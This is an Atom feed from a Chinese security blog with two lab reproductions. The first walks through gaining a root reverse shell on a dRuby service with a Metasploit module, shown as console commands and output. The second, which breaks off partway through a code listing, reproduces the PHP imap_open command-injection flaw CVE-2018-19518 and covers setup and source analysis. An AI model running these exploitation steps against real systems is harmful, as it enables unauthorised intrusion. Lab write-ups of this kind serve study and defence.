<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>HexChristmas&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-03-29T15:20:14.259Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Hex Christmas</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Metasploit对分布式Ruby进行远程代码执行</title>
    <link href="http://yoursite.com/2020/03/29/Metasploit%E5%AF%B9%E5%88%86%E5%B8%83%E5%BC%8FRuby%E8%BF%9B%E8%A1%8C%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <id>http://yoursite.com/2020/03/29/Metasploit对分布式Ruby进行远程代码执行/</id>
    <published>2020-03-29T15:19:32.000Z</published>
    <updated>2020-03-29T15:20:14.259Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Metasploit对分布式Ruby进行远程代码执行"><a href="#Metasploit对分布式Ruby进行远程代码执行" class="headerlink" title="Metasploit对分布式Ruby进行远程代码执行"></a>Metasploit对分布式Ruby进行远程代码执行</h1><p>生活中，开发人员和用户每天都会有相似的操作习惯，这往往是黑客最容易利用对攻击目标与突破点。<br>我们在开发一款产品，每每都会在便利性和安全性之间进行权衡。<br>那么，在分布式Ruby的系统也会存在这样对现象，导致我们使用Metasploit就可以轻松地对其进行测试。</p><h2 id="什么是分布式Ruby？"><a href="#什么是分布式Ruby？" class="headerlink" title="什么是分布式Ruby？"></a>什么是分布式Ruby？</h2><p>什么是分布式？单台计算机的计算能力不足、而又无法使用超级计算机的情况，<br>通过多台计算机的累加，把计算量和数据分布到每一台机器上，以达到超级计算机的效果。<br>分布式Ruby是Ruby编程语言的分布式对象系统，允许Ruby进程之间的远程方法调用。<br>虽然这项技术可以使用灵活的服务来增强某些程序，但如果没有正确实现，就会出现安全漏洞，</p><h2 id="0x01-测试环境"><a href="#0x01-测试环境" class="headerlink" title="0x01 测试环境"></a>0x01 测试环境</h2><p>这里演示，我们的攻击机和靶机都用的是ParrotSecurityOS,<br>IP:172.16.1.102<br>RubyVersion:ruby 2.0.0p648 (2015-12-16) [x86_64-linux]</p><h2 id="0x02-验证漏洞"><a href="#0x02-验证漏洞" class="headerlink" title="0x02 验证漏洞"></a>0x02 验证漏洞</h2><p>在我们的靶机上运行dRuby。在最初设置dRuby时，它会将自身绑定到特定的URI和端口，<br>我们今天演示端口为8787.以便我们可以正确被Nmap扫描。<br>使用nmap -sV ip -p 8787 来扫描目标主机和端口上运行的软件的版本并设置端口为8787<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 172.16.1.102 -p 8787</span><br><span class="line"></span><br><span class="line">[*] exec: nmap -sV 172.16.1.102 -p 8787</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-25 18:16 CST</span><br><span class="line">Nmap scan report for 172.16.1.102</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">8787/tcp open  drb     Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)</span><br><span class="line">MAC Address: 08:00:27:77:62:6C (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 19.65 seconds</span><br></pre></td></tr></table></figure></p><p>我们可以看到dRuby服务存在并正在运行，接下来掏出我们metasploit漏洞利用</p><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>终端键入msfconsole启动Metasploit ，然后search drb以显示任何匹配的结果。如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search drb</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                                                   Disclosure Date  Rank       Check  Description</span><br><span class="line">   ----                                                   ---------------  ----       -----  -----------</span><br><span class="line">   exploit/linux/misc/drb_remote_codeexec                 2011-03-23       excellent  No     Distributed Ruby Remote Code Execution</span><br><span class="line">   exploit/multi/misc/wireshark_lwres_getaddrbyname       2010-01-27       great      No     Wireshark LWRES Dissector getaddrsbyname_request Buffer Overflow</span><br><span class="line">   exploit/multi/misc/wireshark_lwres_getaddrbyname_loop  2010-01-27       great      No     Wireshark LWRES Dissector getaddrsbyname_request Buffer Overflow (loop)</span><br></pre></td></tr></table></figure></p><p>我们可以看到drb_remote_codeexec就是我们要找的，233。你可以使用use命令加载漏洞，然后在使用模块的路径。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/linux/misc/drb_remote_codeexec</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(linux/misc/drb_remote_codeexec) &gt; info</span><br><span class="line"></span><br><span class="line">       Name: Distributed Ruby Remote Code Execution</span><br><span class="line">     Module: exploit/linux/misc/drb_remote_codeexec</span><br><span class="line">   Platform: Unix</span><br><span class="line">       Arch: cmd</span><br><span class="line"> Privileged: No</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Excellent</span><br><span class="line">  Disclosed: 2011-03-23</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  joernchen &lt;joernchen@phenoelit.de&gt;</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">  Id  Name</span><br><span class="line">  --  ----</span><br><span class="line">  0   Automatic</span><br><span class="line">  1   Trap</span><br><span class="line">  2   Eval</span><br><span class="line">  3   Syscall</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  No</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name   Current Setting  Required  Description</span><br><span class="line">  ----   ---------------  --------  -----------</span><br><span class="line">  RHOST                   no        The target address</span><br><span class="line">  RPORT  8787             yes       The target port</span><br><span class="line">  URI                     no        The URI of the target host (druby://host:port) (overrides RHOST/RPORT)</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line">  Space: 32768</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module exploits remote code execution vulnerabilities in dRuby.</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  CVE: Not available</span><br><span class="line">  http://www.ruby-doc.org/stdlib-1.9.3/libdoc/drb/rdoc/DRb.html</span><br><span class="line">  http://blog.recurity-labs.com/archives/2011/05/12/druby_for_penetration_testers/</span><br><span class="line">  http://bugkraut.de/posts/tainting</span><br></pre></td></tr></table></figure><p>0x04启动漏洞利用<br>设置目标ip，端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(linux/misc/drb_remote_codeexec) &gt; set rhost 172.16.1.102</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rhost =&gt; 172.16.1.102</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(linux/misc/drb_remote_codeexec) &gt; show payloads</span><br><span class="line"></span><br><span class="line">Compatible Payloads</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">   Name                                Disclosure Date  Rank    Check  Description</span><br><span class="line">   ----                                ---------------  ----    -----  -----------</span><br><span class="line">   cmd/unix/bind_awk                                    normal  No     Unix Command Shell, Bind TCP (via AWK)</span><br><span class="line">   cmd/unix/bind_busybox_telnetd                        normal  No     Unix Command Shell, Bind TCP (via BusyBox telnetd)</span><br><span class="line">   cmd/unix/bind_lua                                    normal  No     Unix Command Shell, Bind TCP (via Lua)</span><br><span class="line">   cmd/unix/bind_netcat                                 normal  No     Unix Command Shell, Bind TCP (via netcat)</span><br><span class="line">   cmd/unix/bind_netcat_gaping                          normal  No     Unix Command Shell, Bind TCP (via netcat -e)</span><br><span class="line">   cmd/unix/bind_netcat_gaping_ipv6                     normal  No     Unix Command Shell, Bind TCP (via netcat -e) IPv6</span><br><span class="line">   cmd/unix/bind_nodejs                                 normal  No     Unix Command Shell, Bind TCP (via nodejs)</span><br><span class="line">   cmd/unix/bind_perl                                   normal  No     Unix Command Shell, Bind TCP (via Perl)</span><br><span class="line">   cmd/unix/bind_perl_ipv6                              normal  No     Unix Command Shell, Bind TCP (via perl) IPv6</span><br><span class="line">   cmd/unix/bind_r                                      normal  No     Unix Command Shell, Bind TCP (via R)</span><br><span class="line">   cmd/unix/bind_ruby                                   normal  No     Unix Command Shell, Bind TCP (via Ruby)</span><br><span class="line">   cmd/unix/bind_ruby_ipv6                              normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6</span><br><span class="line">   cmd/unix/bind_socat_udp                              normal  No     Unix Command Shell, Bind UDP (via socat)</span><br><span class="line">   cmd/unix/bind_stub                                   normal  No     Unix Command Shell, Bind TCP (stub)</span><br><span class="line">   cmd/unix/bind_zsh                                    normal  No     Unix Command Shell, Bind TCP (via Zsh)</span><br><span class="line">   cmd/unix/generic                                     normal  No     Unix Command, Generic Command Execution</span><br><span class="line">   cmd/unix/reverse                                     normal  No     Unix Command Shell, Double Reverse TCP (telnet)</span><br><span class="line">   cmd/unix/reverse_awk                                 normal  No     Unix Command Shell, Reverse TCP (via AWK)</span><br><span class="line">   cmd/unix/reverse_bash                                normal  No     Unix Command Shell, Reverse TCP (/dev/tcp)</span><br><span class="line">   cmd/unix/reverse_bash_telnet_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (telnet)</span><br><span class="line">   cmd/unix/reverse_ksh                                 normal  No     Unix Command Shell, Reverse TCP (via Ksh)</span><br><span class="line">   cmd/unix/reverse_lua                                 normal  No     Unix Command Shell, Reverse TCP (via Lua)</span><br><span class="line">   cmd/unix/reverse_ncat_ssl                            normal  No     Unix Command Shell, Reverse TCP (via ncat)</span><br><span class="line">   cmd/unix/reverse_netcat                              normal  No     Unix Command Shell, Reverse TCP (via netcat)</span><br><span class="line">   cmd/unix/reverse_netcat_gaping                       normal  No     Unix Command Shell, Reverse TCP (via netcat -e)</span><br><span class="line">   cmd/unix/reverse_nodejs                              normal  No     Unix Command Shell, Reverse TCP (via nodejs)</span><br><span class="line">   cmd/unix/reverse_openssl                             normal  No     Unix Command Shell, Double Reverse TCP SSL (openssl)</span><br><span class="line">   cmd/unix/reverse_perl                                normal  No     Unix Command Shell, Reverse TCP (via Perl)</span><br><span class="line">   cmd/unix/reverse_perl_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via perl)</span><br><span class="line">   cmd/unix/reverse_php_ssl                             normal  No     Unix Command Shell, Reverse TCP SSL (via php)</span><br><span class="line">   cmd/unix/reverse_python                              normal  No     Unix Command Shell, Reverse TCP (via Python)</span><br><span class="line">   cmd/unix/reverse_python_ssl                          normal  No     Unix Command Shell, Reverse TCP SSL (via python)</span><br><span class="line">   cmd/unix/reverse_r                                   normal  No     Unix Command Shell, Reverse TCP (via R)</span><br><span class="line">   cmd/unix/reverse_ruby                                normal  No     Unix Command Shell, Reverse TCP (via Ruby)</span><br><span class="line">   cmd/unix/reverse_ruby_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)</span><br><span class="line">   cmd/unix/reverse_socat_udp                           normal  No     Unix Command Shell, Reverse UDP (via socat)</span><br><span class="line">   cmd/unix/reverse_ssl_double_telnet                   normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)</span><br><span class="line">   cmd/unix/reverse_stub                                normal  No     Unix Command Shell, Reverse TCP (stub)</span><br><span class="line">   cmd/unix/reverse_zsh                                 normal  No     Unix Command Shell, Reverse TCP (via Zsh)</span><br><span class="line">   generic/custom                                       normal  No     Custom Payload</span><br><span class="line">   generic/shell_bind_tcp                               normal  No     Generic Command Shell, Bind TCP Inline</span><br><span class="line">   generic/shell_reverse_tcp                            normal  No     Generic Command Shell, Reverse TCP Inline</span><br></pre></td></tr></table></figure><p>我们选择<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">msf exploit(linux/misc/drb_remote_codeexec) &gt; set payload cmd/unix/reverse_ruby</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload =&gt; cmd/unix/reverse_ruby</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(linux/misc/drb_remote_codeexec) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/misc/drb_remote_codeexec):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   RHOST  172.16.1.102     no        The target address</span><br><span class="line">   RPORT  8787             yes       The target port</span><br><span class="line">   URI                     no        The URI of the target host (druby://host:port) (overrides RHOST/RPORT)</span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/reverse_ruby):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure><p>设置监听地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(linux/misc/drb_remote_codeexec) &gt; set lhost 172.16.1.100</span><br><span class="line"></span><br><span class="line">lhost =&gt; 172.16.1.100</span><br></pre></td></tr></table></figure></p><p>0x05 获取Shell<br>直接run<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(linux/misc/drb_remote_codeexec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 172.16.1.100:4444</span><br><span class="line">[*] Trying to exploit instance_eval method</span><br><span class="line">[!] Target is not vulnerable to instance_eval method</span><br><span class="line">[*] Trying to exploit syscall method</span><br><span class="line">[*] attempting x86 execve of .JU4AK4Gh3sOBkaB7</span><br><span class="line">[+] Deleted .JU4AK4Gh3sOBkaB7</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">uname -a</span><br><span class="line">Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux</span><br><span class="line">ip address</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">    inet6 ::1/128 scope host</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000</span><br><span class="line">    link/ether 08:00:27:77:62:6c brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.16.1.102/12 brd 172.31.255.255 scope global eth0</span><br><span class="line">    inet6 fe80::a00:27ff:fe77:626c/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      Metasploit对分布式Ruby进行远程代码执行复现
    
    </summary>
    
    
      <category term="metasploit" scheme="http://yoursite.com/tags/metasploit/"/>
    
      <category term="ruby" scheme="http://yoursite.com/tags/ruby/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-19518:PHP imap_open函数任意命令执行漏洞复现</title>
    <link href="http://yoursite.com/2020/03/29/CVE-2018-19518-PHP-imap-open%E5%87%BD%E6%95%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2020/03/29/CVE-2018-19518-PHP-imap-open函数任意命令执行漏洞复现/</id>
    <published>2020-03-29T15:17:55.000Z</published>
    <updated>2020-03-29T15:19:00.552Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2018-19518-PHP-imap-open函数任意命令执行漏洞复现"><a href="#CVE-2018-19518-PHP-imap-open函数任意命令执行漏洞复现" class="headerlink" title="CVE-2018-19518:PHP imap_open函数任意命令执行漏洞复现"></a>CVE-2018-19518:PHP imap_open函数任意命令执行漏洞复现</h1><h1 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h1><ul><li>Ubuntu<br><a href="https://people.canonical.com/~ubuntu-security/cve/2018/CVE-2018-19518.html" target="_blank" rel="noopener">https://people.canonical.com/~ubuntu-security/cve/2018/CVE-2018-19518.html</a></li><li>Debian<br><a href="https://security-tracker.debian.org/tracker/CVE-2018-19518" target="_blank" rel="noopener">https://security-tracker.debian.org/tracker/CVE-2018-19518</a></li><li>Red Hat<br><a href="https://access.redhat.com/security/cve/cve-2018-19518" target="_blank" rel="noopener">https://access.redhat.com/security/cve/cve-2018-19518</a></li><li>SUSE<br><a href="https://www.suse.com/security/cve/CVE-2018-19518/" target="_blank" rel="noopener">https://www.suse.com/security/cve/CVE-2018-19518/</a><h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1>PHP 的imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。</li></ul><p>该漏洞的存在是因为受影响的软件的imap_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令。</p><p>利用此漏洞的功能代码是Metasploit Framework的一部分。</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>要利用此漏洞，攻击者必须具有对目标系统的用户级访问权限。此访问要求可以降低成功利用的可能性。</p><h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h2 id="系统Debian9"><a href="#系统Debian9" class="headerlink" title="系统Debian9"></a>系统Debian9</h2><h2 id="安装PHP及其他包（php7-0-30）"><a href="#安装PHP及其他包（php7-0-30）" class="headerlink" title="安装PHP及其他包（php7.0.30）"></a>安装PHP及其他包（php7.0.30）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get install -y nano php</span><br></pre></td></tr></table></figure><h2 id="我们需要对PHP做一些安全的配置"><a href="#我们需要对PHP做一些安全的配置" class="headerlink" title="我们需要对PHP做一些安全的配置"></a>我们需要对PHP做一些安全的配置</h2><p>比如说<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo ‘; priority=99’ &gt; /etc/php/7.0/mods-available/disablefns.ini</span><br><span class="line">echo ‘disable_functions=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source’ &gt;&gt; /etc/php/7.0/mods-available/disablefns.ini</span><br><span class="line">phpenmod disablefns</span><br></pre></td></tr></table></figure></p><h2 id="SSH安装"><a href="#SSH安装" class="headerlink" title="SSH安装"></a>SSH安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y ssh</span><br></pre></td></tr></table></figure><h2 id="strace工具安装"><a href="#strace工具安装" class="headerlink" title="strace工具安装"></a>strace工具安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y strace</span><br></pre></td></tr></table></figure><h2 id="IMAP模块安装"><a href="#IMAP模块安装" class="headerlink" title="IMAP模块安装"></a>IMAP模块安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp/</span><br><span class="line">wget http://http.debian.net/debian/pool/main/u/uw-imap/uw-imap_2007f\~dfsg-2.dsc</span><br><span class="line">wget http://http.debian.net/debian/pool/main/u/uw-imap/uw-imap_2007f\~dfsg.orig.tar.gz</span><br><span class="line">wget http://http.debian.net/debian/pool/main/u/uw-imap/uw-imap_2007f\~dfsg-2.debian.tar.gz</span><br><span class="line">apt-get install dpkg-dev</span><br><span class="line">dpkg-source -x uw-imap_2007f\~dfsg-2.dsc imap-2007f</span><br><span class="line">mv imap-2007f /usr/local/</span><br></pre></td></tr></table></figure><h2 id="什么是IMAP？"><a href="#什么是IMAP？" class="headerlink" title="什么是IMAP？"></a>什么是IMAP？</h2><p>为什么我们要先了解这个？因为IMAP是在系统中执行任何命令的桥梁。Internet消息访问协议（IMAP）是电子邮件客户端用于通过TCP / IP连接从邮件服务器检索电子邮件的Internet标准协议。IMAP由Mark Crispin于1986年设计为远程邮箱协议，与广泛使用的POP（一种用于检索邮箱内容的协议）形成对比。目前，IMAP由RFC 3501定义规格。IMAP的设计目标是允许多个电子邮件客户端完全管理电子邮件收件箱。因此，客户端通常会在服务器上保留消息，直到用户明确删除它们为止。IMAP服务器通常侦听端口号143.默认情况下，为IMAP over SSL（IMAPS）分配端口号993。当然，PHP支持IMAP开箱即用。为了使协议的工作更容易，PHP有许多功能。在所有这些功能中，我们只对imap_open尽心讨论和探究。它用于打开邮箱的IMAP Stream。该函数不是PHP核心函数; 它是从华盛顿大学开发的UW IMAP工具包环境导入的，该库的最新版本大约在7年前于2011年发布。<br>也许，IMAP在PHP中是这样调用的,比如说<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resource imap_open ( string $mailbox , string $username , string $password [, int $options = 0 [, int $n_retries = 0 [, array $params = NULL ]]] )</span><br></pre></td></tr></table></figure></p><p>使用mailbox参数来定义连接的服务器，比如说<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;[host]&#125;:[port][flags]&#125;[mailbox_name]</span><br></pre></td></tr></table></figure></p><p>IMAP允许您使用预先验证的ssh或rsh会话自动登录服务器。当您不需要使用该功能时使用的标志然后默认尝试使用该标志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/imap-2007f/</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat src/osdep/unix/tcp_unix.c：</span><br></pre></td></tr></table></figure><p>可以看到tcp_aopen的工作原理及主要功能在tcp_unix.c被定义<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/* TCP/IP authenticated open</span><br><span class="line"> * Accepts: host name</span><br><span class="line"> *          service name</span><br><span class="line"> *          returned user name buffer</span><br><span class="line"> * Returns: TCP/IP stream if success else NIL</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">#define MAXARGV 20</span><br><span class="line">...</span><br><span class="line">TCPSTREAM *tcp_aopen (NETMBX *mb,char *service,char *usrbuf)</span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure></p><p>我们看一下ssh和rsh的路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#ifdef SSHPATH                  /* ssh path defined yet? */</span><br><span class="line">  if (!sshpath) sshpath = cpystr (SSHPATH);</span><br><span class="line">#endif</span><br><span class="line">#ifdef RSHPATH                  /* rsh path defined yet? */</span><br><span class="line">  if (!rshpath) rshpath = cpystr (RSHPATH);</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure></p><p>可以看到，写到了如果没有定义SSHPATH，那么将尝试读取RSHPATH。其中部分代码将会帮你找到SSHPATH定义发生的位置<br>代码示例如下：<br>/imap-2007f/src/osdep/unix/env_unix.h：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/* dorc() options */</span><br><span class="line"></span><br><span class="line">#define SYSCONFIG &quot;/etc/c-client.cf&quot;</span><br></pre></td></tr></table></figure></p><p>/imap-2007f/src/osdep/unix/env_unix.c：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 